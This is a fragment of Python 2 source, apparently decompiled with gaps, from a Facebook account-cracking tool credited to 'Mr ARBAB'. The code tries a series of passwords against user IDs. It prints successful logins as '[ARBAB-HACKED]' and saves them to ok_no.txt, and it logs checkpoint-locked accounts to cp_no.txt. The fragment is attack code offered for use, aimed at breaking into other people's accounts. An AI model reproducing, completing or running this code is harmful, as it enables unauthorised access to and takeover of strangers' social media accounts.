...
def main_menu_select():
    ...
    print 50 * '-'
    print ''
    print ('\x1b[1;91m\x1b[1;32mCreated By : Mr ARBAB\x1b[0;97m').center(70)
    print ''
    print 50 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[ARBAB-HACKED] \x1b[1;30m' + k + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok_no.txt', 'a')
                ok.write(k + c + user + ' | ' + pass1)
                ok.close()
                oks.append(k + c + user + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[ARBAB-CP] ' + k + c + user + ' | ' + pass1
                cp = open('cp_no.txt', 'a')
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[ARBAB-HACKED] \x1b[1;30m' + k + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok_no.txt', 'a')
                    ok.write(k + c + user + ' | ' + pass2)
                    ok.close()
                    oks.append(k + c + user + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[ARBAB-CP] ' + k + c + user + ' | ' + pass2
                    cp = open('cp_no.txt', 'a')
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[ARBAB-HACKED] \x1b[1;90m' + k + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok_no.txt', 'a')
                        ok.write(k + c + user + ' | ' + pass3)
                        ok.close()
                        oks.append(k + c + user + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[ARBAB-CP] ' + k + c + user + ' | ' + pass3
                        cp = open('cp_no.txt', 'a')
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[ARBAB-HACKED] \x1b[1;90m' + k + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok_no.txt', 'a')
                            ok.write(k + c + user + ' | ' + pass4)
                            ok.close()
                            oks.append(k + c + user + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[ARBAB-CP] ' + k + c + user + ' | ' + pass4
                            cp = open('cp_no.txt', 'a')
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;32m[ARBAB-HACKED] \x1b[1;90m' + k + c + user + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok_no.txt', 'a')
                                ok.write(k + c + user + ' | ' + pass5)
                                ok.close()
                                oks.append(k + c + user + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '[ARBAB-CP] ' + k + c + user + ' | ' + pass5
                                cp = open('cp_no.txt', 'a')
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;32m[ARBAB-HACKED] \x1b[1;90m' + k + c + user + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok_no.txt', 'a')
                                    ok.write(k + c + user + ' | ' + pass6)
                                    ok.close()
                                    oks.append(k + c + user + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '[ARBAB-CP] ' + k + c + user + ' | ' + pass6
                                    cp = open('cp_no.txt', 'a')
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;32m[ARBAB-HACKED] \x1b[1;30m' + k + c + user + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok_no.txt', 'a')
